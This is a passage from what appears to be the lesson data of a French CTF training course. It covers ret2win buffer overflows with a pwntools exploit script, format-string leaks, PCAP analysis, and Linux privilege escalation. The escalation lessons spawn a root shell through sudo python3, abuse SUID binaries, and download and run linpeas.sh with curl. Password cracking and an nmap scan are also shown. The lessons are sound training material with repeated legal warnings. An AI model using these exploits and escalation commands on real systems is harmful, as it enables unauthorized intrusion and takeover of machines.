p.sendline(b"AAAA")                 # envoyer une ligne
p.recvline()                        # recevoir une ligne
p.interactive()                     # passer en mode interactif`),
            h("Les étapes pédagogiques du buffer overflow"),
            list(
              "Identifier le point d'entrée : une fonction qui lit sans vérifier la taille — gets(), strcpy sont les coupables classiques.",
              "Mesurer l'offset : envoyer cyclic(200) au programme ; quand il crashe, le message d'erreur indique l'adresse écrasée ; cyclic_find() donne la taille du tampon avant l'adresse de retour.",
              "Construire le payload : b\\\"A\\\"*offset + p64(adresse_de_win) — l'adresse de la fonction win() encodée en petit-boutiste.",
              "Envoyer et récupérer le flag via p.interactive()."
            ),
            h("Mesurer l'offset avec cyclic"),
            code(`from pwn import *

cyclic(100)           # génère un motif de 100 octets, ex: b'aaaabaaacaaa...'
cyclic_find(b'baaa') # retrouve à quelle position ce motif se trouve`),
            h("Construire et envoyer le payload"),
            p(
              "Sur une machine d'entraînement, le binaire vuln affiche « Enter your name: ». checksec montre : NX activé, PIE absent. nm révèle la fonction win à l'adresse 0x401186. Le tampon fait 64 octets. Le payload redirige l'exécution vers win(), qui imprime le flag."
            ),
            code(`from pwn import *

p = process("./vuln")
p.recvline()
payload = b"A"*64 + p64(0x401186)
p.sendline(payload)
print(p.recvall().decode())`),
            h("L'encodage des adresses : le petit-boutiste"),
            p(
              "Les processeurs x86 stockent les nombres en petit-boutiste (little-endian) : l'octet de poids faible en premier. Une adresse comme 0x401186 devient les octets 86 11 40 00 00 00 00 00. Ne tape jamais ça à la main : p64() (8 octets) et p32() (4 octets) encodent pour toi."
            ),
            h("Bonnes pratiques Pwn"),
            list(
              "Pédagogie d'abord : les défis Pwn s'entraînent sur des binaires de test, jamais sur des programmes réels.",
              "Toujours lancer checksec avant de réfléchir : il détermine toute la stratégie.",
              "Utiliser p64() et p32() pour encoder les adresses.",
              "Travailler avec un script Python reproductible plutôt que des commandes tapées à la main : le payload doit être exact.",
              "Ne jamais envoyer de payload sur un service sans être certain de l'autorisation."
            ),
            callout(
              "Le buffer overflow s'étudie UNIQUEMENT sur des binaires de test et des plateformes qui t'y autorisent. Exploiter une vulnérabilité mémoire sur un système réel sans autorisation écrite est un délit grave (article 323-1 du code pénal). Ce cours ne t'autorise jamais à tester une machine sans autorisation.",
              "danger"
            ),
            h("En résumé"),
            list(
              "Pwn = exploitation mémoire : faire déborder un tampon pour rediriger l'exécution.",
              "Protections à vérifier avec checksec : ASLR, NX, canary, PIE.",
              "ret2win : sauter vers une fonction win() existante en écrasant l'adresse de retour.",
              "pwntools : cyclic() mesure l'offset, p64() encode les adresses, process()/remote() pilotent le programme.",
              "Travailler avec un script reproductible, jamais à la main."
            )
          ]
        },
        {
          id: "ctf-lecon-15",
          title: "Pwn — format string et lab virtuel",
          type: "theory",
          duration: "16 min",
          blocks: [
            h("La chaîne de format qui fuit"),
            p(
              "Une format string est une vulnérabilité où l'utilisateur contrôle le format d'une fonction printf(). En envoyant %x (affiche un nombre hexadécimal de la pile) ou %n (écrit en mémoire), on peut lire la mémoire (et potentiellement y écrire). Le programme croit afficher un texte, mais il déroule la pile et « fuit » son contenu."
            ),
            h("Le principe en un exemple"),
            p(
              "Si un programme fait printf(entrée_utilisateur) au lieu de printf(\\\"%s\\\", entrée_utilisateur), et que tu envoies %x.%x.%x.%x.%x, le programme affiche des valeurs hexadécimales provenant de sa pile : des adresses, des variables, des restes de données. Le flag y est parfois stocké."
            ),
            code(`%x.%x.%x.%x.%x
# 41414141.7ffc1234.41424344.f7e2d4a0.0...`),
            h("Lire la mémoire avec %x"),
            p(
              "Chaque %x consomme une valeur de 4 octets de la pile et l'affiche en hexadécimal. En enchaînant les %x, tu « déroules » la pile : tu lis son contenu, y compris des zones qui ne devraient pas être exposées. En CTF, le flag stocké dans une variable ou une structure proche peut apparaître dans cette fuite."
            ),
            h("Écrire en mémoire avec %n"),
            p(
              "Le spécificateur %n est plus dangereux : il écrit en mémoire le nombre de caractères déjà affichés. Combiné à un placement précis dans la pile, il permet d'écrire des valeurs arbitraires à des adresses choisies. C'est la base de nombreuses exploits, mais c'est une technique avancée : commence par lire (la fuite), pas par écrire."
            ),
            h("Les protections de la pile (rappel)"),
            p(
              "Comme pour le buffer overflow, tout se décide avec checksec : NX (pile non exécutable), canary (sentinelle anti-débordement), PIE (adresses aléatoires), ASLR (randomisation du système). Une format string contourne parfois ces protections parce qu'elle ne déborde pas le tampon : elle lit et écrit à travers les spécificateurs de format."
            ),
            h("Le lab virtuel : pourquoi et comment"),
            p(
              "Les vulnérabilités mémoire s'étudient dans des environnements isolés et jetables. Trois options : une machine virtuelle (VirtualBox, VMware) avec un Linux léger, un conteneur Docker dédié à l'entraînement, ou les plateformes en ligne qui hébergent des binaires de test (TryHackMe, Root-Me, pwn.college). Le but est d'avoir un terrain où un crash ne casse rien."
            ),
            code(`# Lancer un conteneur d'entraînement isolé
docker run -it --rm --name pwnlab ubuntu:22.04 bash
apt update && apt install -y python3 python3-pip gdb netcat-openbsd
pip3 install pwntools`),
            h("L'ordre d'apprentissage recommandé"),
            list(
              "Apprendre le langage C de base : variables, tampons, gets, strcpy, printf.",
              "Comprendre la pile : adresses de retour, variables locales, arguments.",
              "S'entraîner sur des ret2win sans protections : checksec pour vérifier.",
              "Ajouter les protections une par une : canary, PIE, NX, et apprendre à les contourner.",
              "Lire les write-ups des challenges que tu n'as pas réussi : c'est la progression."
            ),
            h("Pourquoi les langages modernes protègent"),
            p(
              "Rust, Go et les langages gérés (Python, Java) gèrent la mémoire automatiquement et interdisent ce genre de débordement par construction. Mais des millions de lignes de C/C++ tournent encore dans les systèmes critiques : noyaux, routeurs, applications embarquées. Comprendre Pwn, c'est comprendre pourquoi cette migration est un enjeu de sécurité."
            ),
            h("Bonnes pratiques du lab"),
            list(
              "Ne jamais lancer un binaire d'un challenge avec des privilèges root sur ta machine principale.",
              "Travailler dans un environnement jetable : VM, conteneur, machine de la plateforme.",
              "Garder tes scripts pwntools versionnés : chaque payload doit être reproductible.",
              "Documenter chaque étape : offset, adresses, protections, résultat."
            ),
            callout(
              "La format string et le buffer overflow se pratiquent uniquement dans des laboratoires virtuels autorisés (ta VM, un conteneur, les plateformes d'entraînement). Utiliser ces techniques pour lire ou modifier la mémoire d'un programme, d'un serveur ou d'une machine sans autorisation est un délit (article 323-1 du code pénal).",
              "danger"
            ),
            h("En résumé"),
            list(
              "Format string : contrôler le format de printf pour lire (%x) et écrire (%n) en mémoire.",
              "%x déroule la pile, %n écrit en mémoire : commence par lire.",
              "Le lab virtuel est indispensable : VM, conteneur Docker ou plateforme dédiée.",
              "L'ordre : C → pile → ret2win sans protections → contourner les protections une par une."
            )
          ]
        },
        {
          id: "ctf-lecon-16",
          title: "Networking — PCAP, tcpdump et Wireshark",
          type: "exercise",
          duration: "18 min",
          blocks: [
            h("Écouter la conversation du réseau"),
            p(
              "Les challenges de catégorie réseau te fournissent une capture de trafic : un enregistrement binaire de tout ce qui est passé sur le réseau. Quelque part dans les paquets se cache le flag : dans une requête, une réponse, un fichier transféré, un mot de passe échangé en clair. Ton travail : lire la capture, filtrer le trafic, retrouver le flag."
            ),
            h("Les outils"),
            list(
              "tshark : la version ligne de commande de Wireshark — vue d'ensemble et filtres -Y.",
              "tcpdump : lecture de fichiers avec -r, contenu ASCII avec -A.",
              "strings : extraction directe des chaînes du fichier binaire.",
              "Wireshark : l'interface graphique pour explorer visuellement les paquets."
            ),
            h("La démarche pas à pas"),
            p(
              "Un défi fournit capture.pcap. On commence par la vue d'ensemble pour repérer ce qui ressemble à un échange suspect."
            ),
            code(`tshark -r capture.pcap
# 1   0.000000 192.168.1.20 → 192.168.1.10 TCP 54 50000 → 80 [SYN] Seq=0 Len=0
# 2   0.001083 192.168.1.10 → 192.168.1.20 TCP 54 80 → 50000 [SYN, ACK] Seq=0 Len=0
# 3   0.001808 192.168.1.20 → 192.168.1.10 TCP 54 50000 → 80 [ACK] Seq=1 Len=0
# 4   0.002616 192.168.1.20 → 192.168.1.10 HTTP 124 GET /flag.txt HTTP/1.1
# 5   0.003877 192.168.1.10 → 192.168.1.20 TCP 139 HTTP/1.1 200 OK
# 6   0.005023 192.168.1.20 → 192.168.1.10 TCP 54 50000 → 80 [ACK] Seq=65 Len=0`),
            p(
              "Le paquet 4 révèle une requête HTTP GET /flag.txt : un serveur web a servi un fichier nommé flag.txt. On cible ce trafic."
            ),
            h("Filtrer le trafic HTTP"),
            code(`tshark -r capture.pcap -Y "http"
# 4   0.002616 192.168.1.20 → 192.168.1.10 HTTP 124 GET /flag.txt HTTP/1.1
# 5   0.003877 192.168.1.10 → 192.168.1.20 TCP 139 HTTP/1.1 200 OK`),
            p(
              "-Y applique un filtre d'affichage (comme dans Wireshark) : seuls les paquets HTTP sont affichés. On peut aussi filtrer par port : -Y \\\"tcp.port == 80\\\"."
            ),
            h("Lire le contenu en ASCII"),
            code(`tcpdump -r capture.pcap -A
# GET /flag.txt HTTP/1.1
# Host: 192.168.1.10
# User-Agent: curl/8.5.0
#
# HTTP/1.1 200 OK
# Content-Type: text/plain
# Content-Length: 24
#
# FLAG{p4ck3t_4n4lyst}`),
            p(
              "tcpdump -r lit le fichier, -A affiche le contenu des paquets en ASCII : les caractères lisibles ressortent. Le flag est là, en clair, dans la réponse HTTP. HTTP n'est pas chiffré : un flag qui transite sur ce protocole se lit directement."
            ),
            h("Le raccourci : strings"),
            code(`strings capture.pcap | grep -i flag
# FLAG{p4ck3t_4n4lyst}`),
            p(
              "Le flag passe en clair sur le réseau ; strings l'extrait du fichier binaire et grep -i flag le cherche sans se soucier de la casse. C'est souvent le chemin le plus rapide."
            ),
            h("Reproduire la capture soi-même"),
            p(
              "Pour t'entraîner, tu peux générer ta propre capture sur ta machine : crée un fichier flag.txt, lance un serveur HTTP local, capture le trafic sur l'interface loopback avec tcpdump, puis fais la requête."
            ),
            code(`mkdir /tmp/lab-http && cd /tmp/lab-http
echo "FLAG{p4ck3t_4n4lyst}" > flag.txt
python3 -m http.server 8000 &
tcpdump -i lo -w capture.pcap 'tcp port 8000' &
curl http://127.0.0.1:8000/flag.txt
# puis arrêter les deux processus avec Ctrl+C et analyser capture.pcap`),
            h("Chercher une chaîne dans la capture"),
            p(
              "tshark sait aussi chercher une chaîne directement dans les paquets, comme le ferait Wireshark en mode graphique."
            ),
            code(`tshark -r capture.pcap -Y 'frame contains "FLAG"'`),
            h("Lire un champ précis de la réponse"),
            p(
              "Si le contenu de la réponse contient des octets non imprimables, extrais le champ HTTP file_data avec tshark."
            ),
            code(`tshark -r capture.pcap -Y "http.response" -T fields -e http.file_data`),
            h("Les pièges du réseau"),
            list(
              "Se noyer dans des centaines de paquets sans filtre : toujours filtrer avec -Y.",
              "Chercher le flag uniquement dans strings : le flag peut être fragmenté ou encodé — filtrer puis examiner http.file_data.",
              "Croire que le trafic est chiffré : HTTP est en clair, le flag se lit directement.",
              "Confondre les flags TCP (SYN, ACK) avec un flag de défi : le contexte fait la différence."
            ),
            callout(
              "L'analyse de captures s'exerce sur les fichiers fournis par les plateformes autorisées ou sur des captures que tu réalises toi-même sur ta propre machine (interface loopback, labo local). Capturer le trafic d'un réseau sans autorisation est un délit (article 323-1 du code pénal).",
              "danger"
            ),
            h("En résumé"),
            list(
              "tshark -r : vue d'ensemble, -Y \\\"http\\\" pour filtrer.",
              "tcpdump -r -A : contenu en ASCII des paquets.",
              "strings | grep -i flag : le raccourci qui trouve le flag en clair.",
              "HTTP n'est pas chiffré : le flag se lit directement dans la réponse.",
              "Tu peux créer tes propres captures sur l'interface loopback pour t'entraîner."
            )
          ]
        },
        {
          id: "ctf-lecon-17",
          title: "Privilege escalation dans un CTF",
          type: "exercise",
          duration: "18 min",
          blocks: [
            h("Du user au root"),
            p(
              "Dans les machines de type Kill chain (HackTheBox, TryHackMe), le parcours est le même : tu obtiens un premier accès (un shell en tant que user), tu trouves le flag utilisateur, puis tu dois élever tes privilèges pour devenir root et lire le flag administrateur. La privilege escalation (escalade de privilèges) est la seconde moitié du combat."
            ),
            h("La règle avant tout"),
            p(
              "Toute cette leçon se pratique sur des machines d'entraînement prévues pour (HackTheBox, TryHackMe, Root-Me) ou tes propres machines virtuelles. Élever ses privilèges sur une machine sans autorisation est un délit : l'escalade de privilèges est précisément ce que l'article 323-1 du code pénal réprime."
            ),
            h("Les premiers réflexes après un accès"),
            p(
              "Une fois que tu as un shell, tu explores la machine : qui es-tu, où es-tu, que peux-tu exécuter, quels fichiers intéressants existent. Ces commandes ne cassent rien : elles lisent."
            ),
            code(`id
whoami
hostname
uname -a
cat /etc/passwd
ls -la /home
find / -name "*flag*" 2>/dev/null`),
            h("Le fichier /etc/passwd et les comptes"),
            p(
              "Le fichier /etc/passwd liste les comptes de la machine. Chaque ligne : nom, marqueur de mot de passe (x : le mot de passe est dans /etc/shadow), uid, gid, description, home, shell. Les uids 0 sont root. En CTF, lire ce fichier t'informe sur les comptes présents et sur la possibilité d'un mot de passe faible."
            ),
            code(`root:x:0:0:root:/root:/bin/bash
dave:x:1000:1000:dave:/home/dave:/bin/bash`),
            h("sudo -l : ce que tu peux lancer en root"),
            p(
              "La commande sudo -l affiche ce que l'utilisateur a le droit d'exécuter avec sudo, sans mot de passe ou avec. C'est le premier réflexe d'escalade : si une commande est autorisée, elle peut ouvrir un shell root."
            ),
            code(`sudo -l
# User dave may run the following commands on target:
#    (root) NOPASSWD: /usr/bin/python3`),
            p(
              "Dans cet exemple, l'utilisateur peut lancer python3 en root sans mot de passe. Python peut ouvrir un shell interactif : c'est une escalade directe."
            ),
            code(`sudo /usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
# root@target:/home/dave#`),
            h("Les binaires SUID"),
            p(
              "Un binaire SUID (Set User ID) s'exécute avec les privilèges de son propriétaire, quel que soit l'utilisateur qui le lance. Si un binaire SUID appartient à root et qu'il est exploitable, tu obtiens root. Repère-les avec find."
            ),
            code(`find / -perm -4000 -type f 2>/dev/null
# /usr/bin/find
# /usr/bin/python3
# /usr/bin/nano`),
            p(
              "Un binaire SUID root comme python3, nano ou find peut être exploité pour ouvrir un shell : python3 -c 'import pty; pty.spawn(\\\"/bin/bash\\\")' fonctionne directement si le binaire est SUID root."
            ),
            h("Le fichier /etc/sudoers et la configuration"),
            p(
              "Le fichier /etc/sudoers définit les règles sudo. La ligne dave ALL=(ALL) NOPASSWD: /usr/bin/python3 signifie que dave exécute python3 en root sans mot de passe. Une mauvaise configuration de ce fichier est une faille classique des machines d'entraînement."
            ),
            h("Les autres pistes d'escalade"),
            list(
              "Fichiers de configuration exposés : .bashrc, .ssh/id_rsa, scripts de sauvegarde contenant des mots de passe.",
              "Crontab : des tâches planifiées s'exécutent en root — si tu peux écrire dans un script qu'elles appellent, tu contrôles leur action.",
              "Mots de passe réutilisés : le mot de passe de l'utilisateur est parfois aussi celui de root.",
              "Noyau obsolète : un noyau vulnérable se compromet avec un exploit connu — à pratiquer uniquement en labo.",
              "Processus en cours : ps aux révèle des services qui tournent avec des droits élevés et des arguments sensibles."
            ),
            h("La méthodologie d'escalade"),
            p(
              "L'ordre logique : (1) s'informer avec id, uname -a, cat /etc/passwd ; (2) lister les droits avec sudo -l et les binaires SUID ; (3) chercher les fichiers sensibles (configurations, clés SSH, scripts) ; (4) exploiter la piste la plus simple ; (5) documenter chaque étape dans ton carnet."
            ),
            h("Les outils d'énumération"),
            p(
              "Des scripts automatisent l'énumération de la machine : linpeas.sh (Linux) et WinPEAS (Windows) parcourent le système et surlignent les failles d'escalade probables. Sur une machine d'entraînement, les télécharger avec curl et les lancer est le réflexe professionnel."
            ),
            code(`curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh`),
            callout(
              "L'escalade de privilèges se pratique UNIQUEMENT sur des machines d'entraînement (HackTheBox, TryHackMe, Root-Me) ou des machines virtuelles que tu possèdes. Élever tes privilèges sur un système dont tu n'as pas l'autorisation écrite est un délit passible de l'article 323-1 du code pénal.",
              "danger"
            ),
            h("En résumé"),
            list(
              "Après un accès : id, whoami, sudo -l, binaires SUID, fichiers sensibles.",
              "sudo -l liste ce que tu peux lancer en root : une commande comme python3 ouvre un shell.",
              "Les binaires SUID root s'exécutent avec les droits de root : find -perm -4000 les repère.",
              "linpeas automatise l'énumération et surligne les failles probables.",
              "Toujours documenter : chaque escalade réussie devient une brique réutilisable."
            )
          ]
        },
        {
          id: "ctf-lecon-18",
          title: "Chained challenges — résoudre un défi de bout en bout",
          type: "exercise",
          duration: "22 min",
          blocks: [
            h("Quand les étapes s'enchaînent"),
            p(
              "La plupart des challenges ne se résolvent pas en une seule commande : ils enchaînent plusieurs étapes, chacune révélant l'indice de la suivante. C'est exactement ce que font les machines de type Kill chain : une faille web donne un accès, l'accès révèle un fichier, le fichier contient un hash, le hash mène au flag. Cette leçon te fait résoudre un tel challenge de bout en bout, étape par étape, avec la méthode complète."
            ),
            h("Le challenge complet"),
            p(
              "Sur une plateforme d'entraînement, un challenge fournit un fichier archive_pack.zip protégé par mot de passe. L'énoncé : « Le mot de passe est le nom d'un outil de CTF célèbre, tout en minuscules. »"
            ),
            h("Étape 1 — La reconnaissance"),
            code(`file archive_pack.zip
unzip -l archive_pack.zip
# Archive:  archive_pack.zip
#    Length      Date    Time    Name
#    ---------   ---------- -----   ----
#         42     2026-01-01 10:00  note.txt
#          0     2026-01-01 10:00  image/`),
            p(
              "file confirme que c'est bien un ZIP. unzip -l liste le contenu sans extraire : note.txt et un dossier image/. Le ZIP est protégé : la règle du jeu est de trouver le mot de passe."
            ),
            h("Étape 2 — Casser le mot de passe du ZIP"),
            p(
              "zip2john convertit l'archive en un hash que john peut attaquer. Le mot de passe est un nom d'outil de CTF célèbre : en mettant ce mot-clé dans la wordlist ou en laissant john tester rockyou.txt, on trouve rapidement."
            ),
            code(`zip2john archive_pack.zip > hash_zip.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash_zip.txt
john --show hash_zip.txt
# ?:cyberchef
unzip -P cyberchef archive_pack.zip`),
            h("Étape 3 — Lire le premier fichier"),
            code(`cat note.txt
# Bien joue ! Le flag est dans l'image. Mais attention :
# l'image semble normale. Cherche plus profond...`),
            p(
              "Le message t'oriente vers l'image : « l'image semble normale, cherche plus profond ». C'est la langue de la stéganographie et du Forensics : les solutions simples d'abord, puis le fichier emboîté."
            ),
            h("Étape 4 — La pyramide sur l'image"),
            code(`cd image
file mystere.jpg
# mystere.jpg: JPEG image data, JFIF standard 1.01
strings -n 6 mystere.jpg
# (rien d'utile)
exiftool mystere.jpg
# Comment: la stego attend son mot de passe
binwalk mystere.jpg
# DECIMAL  HEXADECIMAL  DESCRIPTION
# 0        0x0          JPEG image data
# 3102     0xC1E        Zip archive data, ... name: secret.txt`),
            p(
              "La métadonnée Comment indique « la stego attend son mot de passe » — un indice vers steghide, qui utilise une passphrase. Et binwalk détecte un ZIP embarqué contenant secret.txt."
            ),
            h("Étape 5 — Extraire le fichier emboîté"),
            code(`binwalk -e mystere.jpg
cat _mystere.jpg.extracted/secret.txt
# aGVsbG9fY3RmX3BsYXllcg==`),
            p(
              "Le fichier extrait contient une chaîne qui finit par == : du base64. C'est un encodage, pas un chiffrement : on décode."
            ),
            h("Étape 6 — Décoder la chaîne"),
            code(`echo "aGVsbG9fY3RmX3BsYXllcg==" | base64 -d
# hello_ctf_player`),
            p(
              "Le message décodé est « hello_ctf_player ». C'est probablement la passphrase attendue par steghide sur l'image originale."
            ),
            h("Étape 7 — Extraire la stéganographie"),
            code(`steghide extract -sf mystere.jpg -p hello_ctf_player
# wrote extracted data to "flag.txt"
cat flag.txt
# CTF{ch41n3d_st3g0_crypt0}`),
            p(
              "Le flag apparaît. Le challenge a enchaîné : casser un ZIP (crypto/hash), lire une note (recon), analyser une image (forensics : file, strings, exiftool, binwalk), décoder du base64 (crypto), et extraire une stéganographie (steghide). Cinq étapes, cinq catégories, un seul flag."
            ),
            h("Ce que ce challenge t'a appris"),
            p(
              "Chaque étape produisait le « passe-partout » de la suivante : le mot de passe du ZIP a ouvert note.txt, la note a pointé vers l'image, la métadonnée a donné le type de stego, le fichier emboîté a donné le base64, qui a donné la passphrase de steghide. C'est la logique des challenges chaînés : chaque indice est la clé de l'étape suivante."
            ),
            h("La checklist de bout en bout"),
            list(
              "Lire l'énoncé : catégorie, format de flag, indices cachés dans les mots.",
              "file sur chaque fichier : la vraie nature avant tout.",
              "strings et exiftool : le texte en clair et les métadonnées.",
              "binwalk / binwalk -e : les fichiers emboîtés.",
              "Décoder tout ce qui ressemble à un encodage : base64, hex, ROT13.",
              "steghide, zsteg, spectrogramme : la stéganographie.",
              "Casser les protections : zip2john + john, hashid + john.",
              "Soumettre le flag exact, noter le write-up complet."
            ),
            h("Documenter le parcours"),
            p(
              "Un challenge chaîné se note comme un rapport : chaque étape, chaque commande, chaque résultat. C'est la matière de ton futur portfolio et l'exercice exact du rapport de pentest que tu rédigeras au niveau 6 et au niveau 8."
            ),
            callout(
              "Ce challenge s'est résolu sur un fichier de plateforme autorisée et avec des outils locaux. Reproduire une chaîne d'étapes (casser, extraire, décoder, stégo) sur un système, un site ou un réseau sans autorisation écrite est un délit (article 323-1 du code pénal).",
              "danger"
            ),
            h("En résumé"),
            list(
              "Les challenges chaînés enchaînent les catégories : chaque indice ouvre l'étape suivante.",
              "Casser le ZIP (zip2john + john), lire la note, analyser l'image (file, strings, exiftool, binwalk).",
              "Décoder le base64, puis utiliser le message comme passphrase de steghide.",
              "Documenter chaque étape : c'est un rapport de pentest miniature."
            )
          ]
        },
      ],
    },
    {
      id: "ctf-module-4",
      title: "Stratégie : temps, équipe, write-ups, création et éthique",
      lessons: [
        {
          id: "ctf-lecon-19",
          title: "Gestion du temps et des priorités",
          type: "theory",
          duration: "12 min",
          blocks: [
            h("La compétition est contre la montre"),
            p(
              "Un CTF en temps réel dure 24 à 72 heures. Sur la ligne de départ, tu disposes de la même quantité de challenges que les autres équipes, et le classement se joue à la vitesse et aux points. Bien gérer ton temps est aussi important que maîtriser les outils : un bon tri vaut une bonne technique."
            ),
            h("Le principe des points par heure"),
            p(
              "Chaque challenge rapporte des points, souvent proportionnels à sa difficulté : un challenge facile vaut 100 points, un difficile 500. Le meilleur rendement n'est pas de tout résoudre, mais de maximiser les points obtenus en 24 heures. Un challenge que tu passes trois heures à rater ne rapporte rien ; trois challenges faciles en une heure rapportent beaucoup."
            ),
            h("Le premier réflexe : la revue des challenges"),
            p(
              "Avant de te lancer dans une commande, fais une revue complète : lis tous les énoncés, classe-les par catégorie, repère ceux qui sont solubles en quelques minutes. L'énoncé est une source d'information : un fichier joint, un indice, un format de flag révèlent souvent la difficulté."
            ),
            h("Le fichier de suivi"),
            p(
              "Les équipes gagnantes tiennent un tableau de bord. Un simple fichier avec le nom du challenge, sa catégorie, ses points, son statut (à faire, en cours, bloqué, résolu) suffit. En temps réel, une vue claire de ce qui reste à faire évite de perdre du temps à relire des énoncés."
            ),
            code(`nom_challenge | categorie | points | statut
web-lfi        | web       | 150    | resolu
base64-decode  | crypto    | 100    | resolu
pwn-format     | pwn       | 400    | bloque
stego-mp3      | stego     | 200    | en cours
osint-ville    | osint     | 150    | a faire`),
            h("Traiter en premier les gains rapides"),
            p(
              "Les challenges « easy » et « warmup » sont conçus pour donner des points rapidement : il faut les traiter en premier. Un classement ne se remonte pas en gardant des points faciles sur la table. Les challenges hard en fin de compétition : ils demandent du temps, de la concentration, et les indices publiés par les organisateurs arrivent plus tard."
            ),
            h("La règle des 30 minutes"),
            p(
              "Une règle d'or : si tu es bloqué trente minutes sur un challenge sans aucune progression, tu changes d'air. Tu le mets en pause, tu en attaques un autre, tu reviens avec le cerveau neuf. L'obsession d'un seul challenge est le piège numéro un : le temps file et le score stagne."
            ),
            h("Prioriser selon le profil de l'équipe"),
            p(
              "Chaque membre est plus fort sur certaines catégories. La gestion du temps individuelle dépend du groupe : si un coéquipier est excellent en crypto, tu ne perds pas deux heures sur un challenge crypto qui le sera résolu par lui en trente minutes. Tu travailles sur ce que l'équipe ne couvre pas."
            ),
            h("Pause, sommeil, café"),
            p(
              "Sur 48 heures, il est physiquement impossible d'être efficace sans sommeil. Les erreurs arrivent avec la fatigue : un flag mal recopié, une commande tapée de travers, une analyse fausse. Planifie des pauses régulières et un créneau de sommeil : les équipes qui dorment résolvent plus de challenges que celles qui tiennent à la caféine."
            ),
            h("La fin de compétition"),
            p(
              "La dernière heure se traite différemment : finis les challenges déjà ouverts, vérifie chaque flag avant de soumettre, et garde du temps pour les formats exacts (flag{} vs CTF{}, majuscules, chiffres). Un flag non soumis est un flag perdu : les points ne comptent qu'une fois soumis et acceptés."
            ),
            h("En résumé"),
            list(
              "Faire une revue complète des challenges avant de commencer.",
              "Traiter d'abord les challenges faciles et les points rapides.",
              "Tenir un fichier de suivi : catégorie, points, statut.",
              "Bloqué depuis 30 minutes sans progression ? Changement de challenge.",
              "Adapter la priorité à la spécialité de chaque membre.",
              "Dormir et faire des pauses : la fatigue coûte plus de points qu'elle n'en rapporte.",
              "La dernière heure : vérifier et soumettre chaque flag."
            )
          ]
        },
        {
          id: "ctf-lecon-20",
          title: "Résoudre plusieurs challenges en parallèle",
          type: "theory",
          duration: "12 min",
          blocks: [
            h("Le cerveau n'a qu'un thread, l'équipe en a plusieurs"),
            p(
              "Un humain résout un problème à la fois : lancer des attaques simultanées n'accélère pas ta réflexion. En revanche, tu peux rendre le temps utile en lançant des tâches longues qui travaillent pour toi pendant que tu en traites d'autres. Le parallélisme en CTF, c'est ne jamais laisser la machine attendre un humain."
            ),
            h("Les tâches qui tournent en arrière-plan"),
            p(
              "De nombreux défis sont des temps d'attente : casser un hash avec john, attaquer un mot de passe en force brute, scanner des ports avec nmap. Ces tâches ne demandent aucune attention : on les lance, on note où elles en sont, et on passe à autre chose. On revient lire le résultat quand il est prêt."
            ),
            code(`hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt &
john --session=crack --wordlist=/usr/share/wordlists/rockyou.txt hash2.txt &
# pendant que hashcat et john travaillent, on attaque un autre challenge
nmap -p- 10.10.10.5 &`),
            p(
              "Le & place la commande en arrière-plan : le terminal reste disponible. La commande jobs liste les tâches en cours, jobs -l affiche leurs PID. Attention cependant à ne pas lancer dix tâches en même temps sur une machine modeste : le processeur sature et tout ralentit."
            ),
            h("Lire les résultats en continu"),
            p(
              "hashcat et john écrivent leurs résultats dans des fichiers : le fichier cracked.txt ou le fichier john.pot. Un simple cat de temps en temps montre les avancées sans interrompre la tâche. Les outils ont aussi des options pour notifier : --outfile avec hashcat, --pot avec john."
            ),
            h("Le tri des challenges : le pipeline"),
            p(
              "En parallèle avec l'attaque, tu tries les challenges : lecture d'énoncé, classement par catégorie et difficulté, premiers essais sur les plus rapides. Ce tri se fait dans les premières minutes : il structure les prochaines heures et évite de perdre du temps en relectures."
            ),
            h("Le journal des essais"),
            p(
              "Quand tu multiplies les challenges en parallèle, ta mémoire ne suit plus. Le réflexe pro : un journal par challenge avec les commandes essayées, les résultats, les hypothèses à tester. En revenant sur un challenge après une pause, tu reprends exactement là où tu t'es arrêté, sans refaire le chemin."
            ),
            h("Le danger de la dispersion"),
            p(
              "Le parallélisme a une limite : l'attention. Ouvrir dix challenges sans en résoudre un seul disperse. La méthode : une tâche lourde en arrière-plan, un challenge actif concentré, et un œil sur la liste des priorités. Le parallélisme sert le score, pas la fuite en avant."
            ),
            h("La répartition dans l'équipe"),
            p(
              "Le vrai parallélisme, c'est l'équipe : cinq membres, cinq challenges différents, chacun dans sa spécialité, et des résultats partagés en continu sur le canal de communication. Un membre annonce un flag trouvé, les autres le soumettent et passent au suivant. Le classement monte quand chacun travaille sur ce qu'il fait le mieux."
            ),
            h("En résumé"),
            list(
              "Lancer hashcat, john et nmap en arrière-plan avec &.",
              "Lire les fichiers de sortie (john.pot, cracked.txt) sans interrompre la tâche.",
              "Faire le tri des challenges en parallèle de l'attaque.",
              "Tenir un journal des essais par challenge.",
              "Un seul challenge concentré à la fois, le reste en arrière-plan.",
              "Le parallélisme de l'équipe multiplie la puissance de travail."
            )
          ]
        },
        {
          id: "ctf-lecon-21",
          title: "Travailler en équipe et se répartir les rôles",
          type: "theory",
          duration: "12 min",
          blocks: [
            h("Un CTF d'équipe est un sport collectif"),
            p(
              "Les grandes compétitions se jouent en équipes de 4 à 8 personnes. La puissance de l'équipe ne vient pas de la somme des talents, mais de leur organisation : chacun sur sa spécialité, communication fluide, aucun doublon. Une équipe bien répartie résout des challenges qu'aucun de ses membres ne résoudrait seul."
            ),
            h("Les rôles typiques d'une équipe"),
            p(
              "La répartition classique suit les catégories de challenges : un spécialiste web, un spécialiste crypto, un spécialiste pwn, un spécialiste forensics, un spécialiste OSINT. En complément, un membre assure le rôle transverse : suivi du classement, tri des challenges, soumission des flags, logistique (sommeil, ravitaillement)."
            ),
            h("Le flux de travail"),
            p(
              "Le parcours d'un challenge dans l'équipe suit un circuit simple : quelqu'un repère un challenge, l'attribue au spécialiste, le spécialiste travaille et annonce le flag, un membre le soumet, le score monte. Ce flux se matérialise par un canal de communication dédié où chaque mouvement est visible par tous."
            ),
            h("Le canal de communication"),
            p(
              "Le serveur de discussion de l'équipe est l'outil central : un canal par catégorie, un canal général pour les annonces, des messages structurés avec le nom du challenge, le statut et les commandes essayées. Le silence est le pire ennemi : un membre qui travaille sans rien partager fait doublon avec un autre ou perd son temps sur un challenge déjà résolu."
            ),
            h("Le partage des découvertes"),
            p(
              "Un résultat intéressant se partage immédiatement : un mot de passe trouvé, un fichier extrait, une piste technique. L'information est la monnaie de l'équipe. Un coéquipier qui connaît le même flag ou la même astuce ne refait pas le travail : il passe à la suite."
            ),
            h("La gestion des doublons"),
            p(
